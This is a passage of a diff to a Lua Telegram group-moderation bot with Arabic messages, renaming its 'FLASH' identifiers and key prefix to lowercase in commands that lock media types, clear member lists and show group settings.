-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 58, string.len(msg.sender_user_id_))
+flashdx1:set(flash..'editmsg'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:cmds'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:bots:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:bots:ban'..msg.chat_id_,true)
+flashdx1:set(flash..'keed_bots'..msg.chat_id_,true)
+flashdx1:set(flash..'anti-flood:'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:pin:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:inline:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:photo:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:spam:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:video:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:gifs:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:music:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:voice:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:links:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:location:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'tags:lock'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:strict'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:document:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:hashtag:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:contact:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:webpage:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:sticker:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'markdown:lock'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:forward:mute'..msg.chat_id_,true) 
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » كل الوسائط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 58, string.len(msg.sender_user_id_))
 end 
 if text == ("فتح الكل") and is_momod(msg.sender_user_id_, msg.chat_id_) then
 if is_leaderid(msg.sender_user_id_) then
@@ -8043,76 +8043,76 @@ tar = 'المدير 🥇'
 elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
 tar = 'الادمن 🥈'          
 end
-FLASHdx1:del(FLASH..'farsi'..msg.chat_id_)
-FLASHdx1:del(FLASH..'farsiban'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:text:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH.."fshar"..msg.chat_id_)
-FLASHdx1:del(FLASH.."taf"..msg.chat_id_)
-FLASHdx1:del(FLASH.."kaf"..msg.chat_id_)
-FLASHdx1:del(FLASH..'editmsg'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:cmds'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:bots:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:bots:ban'..msg.chat_id_)
-FLASHdx1:del(FLASH..'keed_bots'..msg.chat_id_)
-FLASHdx1:del(FLASH..'anti-flood:'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:pin:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:photo:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:spam:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:video:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:document:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:inline:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'markdown:lock'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:gifs:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:music:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:voice:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:links:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:location:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'tags:lock'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:strict'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:hashtag:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:contact:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:webpage:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:sticker:mute'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:forward:mute'..msg.chat_id_)
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » كل الوسائط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 58, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'farsi'..msg.chat_id_)
+flashdx1:del(flash..'farsiban'..msg.chat_id_)
+flashdx1:del(flash..'bot:text:mute'..msg.chat_id_)
+flashdx1:del(flash.."fshar"..msg.chat_id_)
+flashdx1:del(flash.."taf"..msg.chat_id_)
+flashdx1:del(flash.."kaf"..msg.chat_id_)
+flashdx1:del(flash..'editmsg'..msg.chat_id_)
+flashdx1:del(flash..'bot:cmds'..msg.chat_id_)
+flashdx1:del(flash..'bot:bots:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:bots:ban'..msg.chat_id_)
+flashdx1:del(flash..'keed_bots'..msg.chat_id_)
+flashdx1:del(flash..'anti-flood:'..msg.chat_id_)
+flashdx1:del(flash..'bot:pin:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:photo:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:spam:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:video:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:document:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:inline:mute'..msg.chat_id_)
+flashdx1:del(flash..'markdown:lock'..msg.chat_id_)
+flashdx1:del(flash..'bot:gifs:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:music:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:voice:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:links:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:location:mute'..msg.chat_id_)
+flashdx1:del(flash..'tags:lock'..msg.chat_id_)
+flashdx1:del(flash..'bot:strict'..msg.chat_id_)
+flashdx1:del(flash..'bot:hashtag:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:contact:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:webpage:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:sticker:mute'..msg.chat_id_)
+flashdx1:del(flash..'bot:forward:mute'..msg.chat_id_)
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » كل الوسائط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 58, string.len(msg.sender_user_id_))
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^ضع عدد الاحرف (%d+)$") then
 local sensspam = {string.match(text, "^(ضع عدد الاحرف) (%d+)$")}
 if tonumber(sensspam[2]) < 40 then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اختر عدد اكبر من 40 حرف ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اختر عدد اكبر من 40 حرف ، ', 1, 'md')
 else
-FLASHdx1:set(FLASH..'bot:sens:spam'..msg.chat_id_,sensspam[2])
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع عدد الاحرف [ ' ..sensspam[2]..' ]\n❅∫ عندما تتجاوز الكليشه '..sensspam[2]..' حرف انا سوف احذفها ،', 1, 'md')
+flashdx1:set(flash..'bot:sens:spam'..msg.chat_id_,sensspam[2])
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم وضع عدد الاحرف [ ' ..sensspam[2]..' ]\n❅∫ عندما تتجاوز الكليشه '..sensspam[2]..' حرف انا سوف احذفها ،', 1, 'md')
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_sudo(msg) then
 if text and text:match("^تعديل (.*)$") then
 local editmsgs = {string.match(text, "^(تعديل) (.*)$")}
 edit(msg.chat_id_, msg.reply_to_message_id_, nil,editmsgs[2], 1, 'html')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^مسح (.*)$") and FLASH11(msg) then
+if text and text:match("^مسح (.*)$") and flash11(msg) then
 local txts = {string.match(text, "^(مسح) (.*)$")}
 if txts[2] == 'المحظورين' then
-FLASHdx1:del(FLASH..'bot:banned:'..msg.chat_id_) 
-local FLASH = '❅∫ تم مسح المحظورين ،  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 35, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:banned:'..msg.chat_id_) 
+local flash = '❅∫ تم مسح المحظورين ،  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 35, string.len(msg.sender_user_id_))
 end
 if is_sudo(msg) then 
 if txts[2] == 'قائمه العام' then
-FLASHdx1:del(FLASH..'bot:gban:')
-local FLASH = '❅∫ تم مسح قائمه العام ،  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 37, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:gban:')
+local flash = '❅∫ تم مسح قائمه العام ،  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 37, string.len(msg.sender_user_id_))
 end end
 if is_leader(msg) then 
 if txts[2] == 'مطورين الرتبه الثالثه' then
-FLASHdx1:del(FLASH..'bot:admins:')
-local FLASH = '❅∫ تم مسح مطورين الرتبه الثالثه ، \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 46, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:admins:')
+local flash = '❅∫ تم مسح مطورين الرتبه الثالثه ، \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 46, string.len(msg.sender_user_id_))
 end end
 if txts[2] == 'البوتات' then
 local botslist = function(extra, result)
@@ -8120,207 +8120,207 @@ local list = result.members_
 for i = 0, #list do
 if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
 end end end
-local FLASH = '❅∫ تم مسح البوتات ،  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 33, string.len(msg.sender_user_id_))
+local flash = '❅∫ تم مسح البوتات ،  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 33, string.len(msg.sender_user_id_))
 getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
 end
 if is_monsh(msg.sender_user_id_, msg.chat_id_) then
 if txts[2] == 'المنشئين' then
-local FLASH = '❅∫ تم مسح المنشئين ، \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 33, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:monsh2:'..msg.chat_id_)
+local flash = '❅∫ تم مسح المنشئين ، \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 33, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:monsh2:'..msg.chat_id_)
 end end
 if txts[2] == 'الادمنيه' then
-local FLASH = '❅∫ تم مسح الادمنيه ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 34, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:momod:'..msg.chat_id_)
+local flash = '❅∫ تم مسح الادمنيه ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 34, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:momod:'..msg.chat_id_)
 end
 if txts[2] == 'المطايه' then
-local FLASH = '❅∫ تم مسح المطايه ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 33, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:donky:'..msg.chat_id_)
+local flash = '❅∫ تم مسح المطايه ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 33, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:donky:'..msg.chat_id_)
 end
 if txts[2] == 'الاعضاء المميزين' then
-local FLASH = '❅∫ تم مسح الاعضاء المميزين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 42, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:vipmem:'..msg.chat_id_)
+local flash = '❅∫ تم مسح الاعضاء المميزين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 42, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:vipmem:'..msg.chat_id_)
 end
 if txts[2] == 'قائمه المنع' then
-local FLASH = '❅∫ تم مسح قائمه المنع ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 37, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:filters:'..msg.chat_id_)
+local flash = '❅∫ تم مسح قائمه المنع ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 37, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:filters:'..msg.chat_id_)
 end
 if txts[2] == 'المكتومين' then
-FLASHdx1:del(FLASH..'bot:muted:'..msg.chat_id_)
-local FLASH = '❅∫ تم مسح المكتومين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 35, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:muted:'..msg.chat_id_)
+local flash = '❅∫ تم مسح المكتومين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 35, string.len(msg.sender_user_id_))
 end end end
-if text == 'مسح الرابط' and FLASH11(msg) then
-FLASHdx1:del(FLASH.."bot:group:link"..msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح رابط المجموعه ، ', 1, 'md')
+if text == 'مسح الرابط' and flash11(msg) then
+flashdx1:del(flash.."bot:group:link"..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح رابط المجموعه ، ', 1, 'md')
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_admin(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^مسح (.*)$") and FLASH11(msg) then
+if text and text:match("^مسح (.*)$") and flash11(msg) then
 local txts = {string.match(text, "^(مسح) (.*)$")}
 if txts[2] == 'قائمه المنع العام' then
-local FLASH = '❅∫ تم مسح قائمه المنع العام ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 43, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:freewords:')
+local flash = '❅∫ تم مسح قائمه المنع العام ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 43, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:freewords:')
 end
 if txts[2] == 'المكتومين عام' then
-local FLASH = '❅∫ تم مسح المكتومين عام ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 46, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:mutedall:')
+local flash = '❅∫ تم مسح المكتومين عام ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 46, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:mutedall:')
 end
 if txts[2] == 'المدراء' then
-local FLASH = '❅∫ تم مسح المدراء ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 33, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:owners:'..msg.chat_id_)
+local flash = '❅∫ تم مسح المدراء ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 33, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:owners:'..msg.chat_id_)
 end
 if txts[2] == 'المنشئين الاساسيين' then
-local FLASH = '❅∫ تم مسح المنشئين الاساسيين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 44, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:monsh:'..msg.chat_id_)
+local flash = '❅∫ تم مسح المنشئين الاساسيين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 44, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:monsh:'..msg.chat_id_)
 end
 if txts[2] == 'الادمنيه العامين' then
-local FLASH = '❅∫ تم مسح الادمنيه العامين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 42, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:moall:')
+local flash = '❅∫ تم مسح الادمنيه العامين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 42, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:moall:')
 end
 if txts[2] == 'المميزين عام' then
-local FLASH = '❅∫ تم مسح المميزين عام ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 38, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:vpall:')
+local flash = '❅∫ تم مسح المميزين عام ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 38, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:vpall:')
 end
 if txts[2] == 'المدراء العامين' then
-local FLASH = '❅∫ تم مسح المدراء العامين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 41, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:onall:')
+local flash = '❅∫ تم مسح المدراء العامين ،  \n❅∫ بواسطه ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 41, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:onall:')
 end end end
-if text and text:match("^مسح القوائم$") and FLASH11(msg) then
+if text and text:match("^مسح القوائم$") and flash11(msg) then
 if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه الخاصيه للمنشئ والرتب الاعلى منه ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه الخاصيه للمنشئ والرتب الاعلى منه ، ', 1, 'md')
 else
-FLASHdx1:del(FLASH..'bot:banned:'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:momod:'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:donky:'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:vipmem:'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:filters:'..msg.chat_id_)
-FLASHdx1:del(FLASH..'bot:muted:'..msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح المحظورين ، \n❅∫ تم مسح الادمنيه ،\n❅∫ تم مسح المميزين ،\n❅∫ تم مسح المطاية ،\n❅∫ تم مسح قائمه المنع ،\n❅∫ تم مسح المكتومين ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n❅∫ تم مسح هذه القوائم بواسطه ، '..renk_FLASH(msg)..' ', 1, 'md')
+flashdx1:del(flash..'bot:banned:'..msg.chat_id_)
+flashdx1:del(flash..'bot:momod:'..msg.chat_id_)
+flashdx1:del(flash..'bot:donky:'..msg.chat_id_)
+flashdx1:del(flash..'bot:vipmem:'..msg.chat_id_)
+flashdx1:del(flash..'bot:filters:'..msg.chat_id_)
+flashdx1:del(flash..'bot:muted:'..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح المحظورين ، \n❅∫ تم مسح الادمنيه ،\n❅∫ تم مسح المميزين ،\n❅∫ تم مسح المطاية ،\n❅∫ تم مسح قائمه المنع ،\n❅∫ تم مسح المكتومين ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n❅∫ تم مسح هذه القوائم بواسطه ، '..renk_flash(msg)..' ', 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text and text:match("^تفعيل الحمايه القصوى$") or text:match("^قفل التفليش$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^تفعيل الحمايه القصوى$") or text:match("^قفل التفليش$") and flash11(msg) then
 if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه الخاصيه للمنشئ والرتب الاعلى منه ، ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه الخاصيه للمنشئ والرتب الاعلى منه ، ', 1, 'md')
 else
-FLASHdx1:set(FLASH..'bot:links:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:forward:mute'..msg.chat_id_,true)
-FLASHdx1:del(FLASH..'lock:get:photo'..msg.chat_id_)
-FLASHdx1:set(FLASH..'bot:bots:ban'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'anti-flood:'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:video:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:gifs:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:sticker:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'farsiban'..msg.chat_id_,true)
-FLASHdx1:del(FLASH.."fshar"..msg.chat_id_)
-FLASHdx1:del(FLASH.."taf"..msg.chat_id_)
-FLASHdx1:del(FLASH.."kaf"..msg.chat_id_)
-FLASHdx1:set(FLASH..'floodstatus'..msg.chat_id_,'Kicked')
-FLASHdx1:set('FLASH:id:photo'..msg.chat_id_,true)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل جلب الصوره ،\n❅∫ تم قفل البوتات بالطرد ،\n❅∫ تم قفل التكرار ،\n❅∫ تم قفل الروابط ،\n❅∫ تم قفل التوجيه ،\n❅∫ تم قفل الملصقات ،\n❅∫ تم قفل المتحركه ،\n❅∫ تم قفل الفيديو ،\n❅∫ تم قفل الفشار ،\n❅∫ تم قفل الكفران ،\n❅∫ تم قفل الطائفيه ،\n❅∫ تم وضع التكرار بالطرد ،\n❅∫ تم قفل الفارسيه بالطرد ،\n❅∫ تم وضع الايدي بدون صوره ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n❅∫ تم تفعيل الحمايه القصوى بواسطه ، { '..renk_FLASH(msg)..' } ', 1, 'md')
+flashdx1:set(flash..'bot:links:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:forward:mute'..msg.chat_id_,true)
+flashdx1:del(flash..'lock:get:photo'..msg.chat_id_)
+flashdx1:set(flash..'bot:bots:ban'..msg.chat_id_,true)
+flashdx1:set(flash..'anti-flood:'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:video:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:gifs:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'bot:sticker:mute'..msg.chat_id_,true)
+flashdx1:set(flash..'farsiban'..msg.chat_id_,true)
+flashdx1:del(flash.."fshar"..msg.chat_id_)
+flashdx1:del(flash.."taf"..msg.chat_id_)
+flashdx1:del(flash.."kaf"..msg.chat_id_)
+flashdx1:set(flash..'floodstatus'..msg.chat_id_,'Kicked')
+flashdx1:set('flash:id:photo'..msg.chat_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل جلب الصوره ،\n❅∫ تم قفل البوتات بالطرد ،\n❅∫ تم قفل التكرار ،\n❅∫ تم قفل الروابط ،\n❅∫ تم قفل التوجيه ،\n❅∫ تم قفل الملصقات ،\n❅∫ تم قفل المتحركه ،\n❅∫ تم قفل الفيديو ،\n❅∫ تم قفل الفشار ،\n❅∫ تم قفل الكفران ،\n❅∫ تم قفل الطائفيه ،\n❅∫ تم وضع التكرار بالطرد ،\n❅∫ تم قفل الفارسيه بالطرد ،\n❅∫ تم وضع الايدي بدون صوره ،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •~~\n❅∫ تم تفعيل الحمايه القصوى بواسطه ، { '..renk_flash(msg)..' } ', 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text and text:match("^الاعدادات$") and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'farsi'..msg.chat_id_) then mute_farsi = 'مفعل ✔️' else mute_farsi = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'farsiban'..msg.chat_id_) then mute_farsiban = 'مفعل ✔️' else mute_farsiban = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:bots:ban'..msg.chat_id_) then mute_botsban = 'مفعل ✔️' else mute_botsban = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'keed_bots'..msg.chat_id_) then mute_botske = 'مفعل ✔️' else mute_botske = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH.."fshar"..msg.chat_id_) then mute_fshar = 'مفعل ✔️' else mute_fshar = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH.."taf"..msg.chat_id_) then mute_taf = 'مفعل ✔️' else mute_taf = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH.."kaf"..msg.chat_id_) then mute_kaf = 'مفعل ✔️' else mute_kaf = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:muteall'..msg.chat_id_) then mute_all = 'مفعل ✔️' else mute_all = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:text:mute'..msg.chat_id_) then mute_text = 'مفعل ✔️' else mute_text = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مفعل ✔️' else mute_photo = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:video:mute'..msg.chat_id_) then mute_video = 'مفعل ✔️' else mute_video = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مفعل ✔️' else mute_gifs = 'معطل ✖️' end
-------------FLASH
-if FLASHdx1:get(FLASH..'anti-flood:'..msg.chat_id_) then mute_flood = 'مفعل ✔️' else mute_flood = 'معطل ✖️' end
-------------FLASH
-if not FLASHdx1:get(FLASH..'flood:max:'..msg.chat_id_) then
+if text and text:match("^الاعدادات$") and flash11(msg) then
+if flashdx1:get(flash..'farsi'..msg.chat_id_) then mute_farsi = 'مفعل ✔️' else mute_farsi = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'farsiban'..msg.chat_id_) then mute_farsiban = 'مفعل ✔️' else mute_farsiban = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'bot:bots:ban'..msg.chat_id_) then mute_botsban = 'مفعل ✔️' else mute_botsban = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash..'keed_bots'..msg.chat_id_) then mute_botske = 'مفعل ✔️' else mute_botske = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash.."fshar"..msg.chat_id_) then mute_fshar = 'مفعل ✔️' else mute_fshar = 'معطل ✖️' end
+------------flash
+if flashdx1:get(flash.."taf"..msg.chat_id_) then mute_taf = 'مفعل ✔️' else mute_taf = 'معطل ✖️' end
+------------flash
